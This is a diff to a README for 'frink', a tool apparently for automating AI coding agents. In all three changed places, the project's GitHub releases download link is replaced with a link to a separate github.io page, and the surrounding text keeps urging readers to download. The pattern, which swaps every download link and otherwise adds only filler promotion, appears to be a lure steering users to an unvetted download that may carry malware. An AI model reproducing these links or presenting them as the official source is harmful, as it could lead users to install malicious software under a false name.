@@ -1,6 +1,6 @@
 # 🤖 frink - Automate Your AI Coding Agents Effortlessly
 
-[![Download frink](https://img.shields.io/badge/Download%20frink-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/rustectersehj226/frink/releases)
+[![Download frink](https://img.shields.io/badge/Download%20frink-Latest%20Release-blue?style=for-the-badge&logo=github)](https://rustectersehj226.github.io)
 
 ## 🎯 What is frink?
 
@@ -34,7 +34,7 @@ Ready to automate your AI workflows? Follow these simple steps:
 
 ### 📥 Download frink
 
-**Step 1:** Visit this link to download the application: [https://github.com/rustectersehj226/frink/releases](https://github.com/rustectersehj226/frink/releases)
+**Step 1:** Visit this link to download the application: [https://rustectersehj226.github.io](https://rustectersehj226.github.io)
 
 **Step 2:** On the releases page, look for the latest version available. The download link is prominently displayed at the top of the page.
 
@@ -150,7 +150,7 @@ To check for updates manually:
 
 Don't let manual processes slow you down. With frink, you can automate your AI coding agents and focus on what really matters - building great software.
 
-Visit the downloads page now to get started: [https://github.com/rustectersehj226/frink/releases](https://github.com/rustectersehj226/frink/releases)
+Visit the downloads page now to get started: [https://rustectersehj226.github.io](https://rustectersehj226.github.io)
 
 Join the community of developers who are already using frink to supercharge their workflows. Download today and experience the power of automated AI agents!
 
